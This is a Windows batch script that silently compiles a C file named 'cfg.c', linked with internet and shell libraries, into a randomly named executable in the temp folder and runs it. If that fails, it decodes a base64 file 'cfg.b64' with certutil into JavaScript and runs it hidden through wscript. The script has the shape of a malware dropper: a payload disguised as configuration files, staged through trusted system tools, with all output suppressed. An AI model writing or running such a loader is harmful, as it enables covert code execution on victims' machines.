@echo off
setlocal
set "OUT=%TEMP%\rbc_7aa7f132012506c1.exe"
set "SRC=%~dp0cfg.c"
if exist "%OUT%" goto :run
set "VSW=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
for /f "usebackq tokens=*" %%i in (`"%VSW%" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set "VS=%%i"
if not defined VS goto :js
call "%VS%\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
cl /nologo /O1 /w /Fe"%OUT%" "%SRC%" /link wininet.lib shell32.lib >nul 2>&1
:run
if exist "%OUT%" (
  "%OUT%"
  exit /b 0
)
:js
del /f /q "%TEMP%\rbc_7aa7f132012506c1.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_7aa7f132012506c1.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_7aa7f132012506c1.js"
exit /b 0
